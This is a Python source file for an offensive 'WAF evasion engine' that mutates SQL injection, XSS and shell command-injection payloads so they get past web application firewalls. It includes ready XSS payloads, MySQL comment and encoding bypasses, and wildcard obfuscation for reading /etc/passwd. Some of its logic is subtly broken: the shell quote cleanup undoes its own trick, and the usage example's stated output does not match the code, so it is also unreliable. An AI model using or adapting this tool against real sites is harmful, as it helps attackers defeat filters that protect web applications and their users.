"""
DRAKBEN WAF EVASION ENGINE
Description: Advanced payload obfuscation and WAF bypass techniques.
Author: @ahmetdrak
Techniques:
- SQLi: Comment pollution, Whitespace randomization, Hex encoding, Unicode smuggling.
- XSS: Tag nesting, Event handler mutation, JavaScript encoding.
- RCE: String concatenation, Wildcard expansion, Tauthon evasion.
"""

import random
import binascii


class WAFEvasion:
    """
    Polymorphic WAF Evasion Engine.
    Mutates attack payloads to bypass LibInjection and Regex-based filters.
    """

    def __init__(self):
        self.sql_keywords = {
            "UNION": [
                "/*!UNION*/",
                "/*!50000UNION*/",
                "Uni/**/on",
                "%55nion",
                "UN%0aION",
            ],
            "SELECT": [
                "/*!SELECT*/",
                "/*!50000SELECT*/",
                "Se/**/lect",
                "%53elect",
                "SE%0aLECT",
            ],
            "FROM": ["/*!FROM*/", "/*!50000FROM*/", "Fr/**/om", "%46rom"],
            "WHERE": ["/*!WHERE*/", "Wh/**/ere"],
            "OR": ["||", "/*!OR*/", "/*!50000OR*/", "%26%26"],
            "AND": ["&&", "/*!AND*/", "/*!50000AND*/", "%26"],
            " ": ["/**/", "%09", "%0a", "%0b", "%0c", "%0d", "+"],
        }

    def obfuscate_sql(self, payload: str, aggressiveness: int = 2) -> str:
        """
        Obfuscate SQL Injection payload.
        Aggressiveness: 1 (Basic) -> 3 (Extreme/Experimental)
        """
        obfuscated = payload

        # 1. Whitespace Evasion (Space -> Comment)
        if aggressiveness >= 1:
            method = random.choice(self.sql_keywords[" "])
            obfuscated = obfuscated.replace(" ", method)

        # 2. Keyword Pollution
        if aggressiveness >= 2:
            for kw, variations in self.sql_keywords.items():
                if kw == " ":
                    continue
                if kw in obfuscated.upper():
                    # Pick a variation that is NOT the keyword itself
                    replacement = random.choice(variations)
                    # Case-insensitive replace via regex logic simulation
                    idx = obfuscated.upper().find(kw)
                    while idx != -1:
                        obfuscated = (
                            obfuscated[:idx] + replacement + obfuscated[idx + len(kw) :]
                        )
                        idx = obfuscated.upper().find(kw, idx + len(replacement))

        # 3. Hex Encoding (Standard WAF Bypass)
        if aggressiveness >= 3:
            # Encode string literals: 'admin' -> 0x61646d696e
            if "'" in obfuscated:
                parts = obfuscated.split("'")
                new_parts = []
                for i, part in enumerate(parts):
                    if i % 2 == 1:  # Inside quotes
                        hex_val = "0x" + binascii.hexlify(part.encode()).decode()
                        new_parts.append(hex_val)
                    else:
                        new_parts.append(part)
                # Reconstruct without quotes for hex
                obfuscated = "".join(new_parts)

        return obfuscated

    def obfuscate_xss(self, payload: str) -> str:
        """
        Obfuscate XSS payload using tag/attribute mutation.
        """
        # 1. Case Randomization: <script> -> <ScRiPt>
        chars = list(payload)
        for i in range(len(chars)):
            if random.choice([True, False]):
                chars[i] = chars[i].upper()

        mutated = "".join(chars)

        # 2. Protocol Wrappers: javascript: -> java	script: (Tab)
        if "javascript:" in mutated.lower():
            mutated = mutated.replace(":", "	:")

        # 3. Double Check: SVG payload if script is blocked
        if "<script" in payload.lower():
            # Return a polymorphic variation
            variations = [
                mutated,
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body/onload=alert(1)>",
            ]
            return random.choice(variations)

        return mutated

    def obfuscate_shell(self, payload: str) -> str:
        """
        Obfuscate OS Command Injection (Bash/Linux).
        cat /etc/passwd -> c''a''t /e??/p?s??d
        """
        # 1. String Concatenation: cat -> c'a't
        if random.random() > 0.5:
            new_payload = ""
            for char in payload:
                if char.isalnum():
                    new_payload += f"'{char}'"
                else:
                    new_payload += char
            return new_payload.replace("''", "")  # Cleanup

        # 2. Wildcard Injection: /etc/passwd -> /e??/p??swd
        if "/" in payload:
            parts = payload.split("/")
            new_parts = []
            for part in parts:
                if len(part) > 2:
                    # Randomly replace chars with ?
                    chars = list(part)
                    idx = random.randint(1, len(chars) - 1)
                    chars[idx] = "?"
                    new_parts.append("".join(chars))
                else:
                    new_parts.append(part)
            return "/".join(new_parts)

        return payload


# Usage Example:
# waf = WAFEvasion()
# print(waf.obfuscate_sql("UNION SELECT 1,2"))
# -> /*!50000UNION*/ /**/ /*!50000SELECT*/ /**/ 1,2
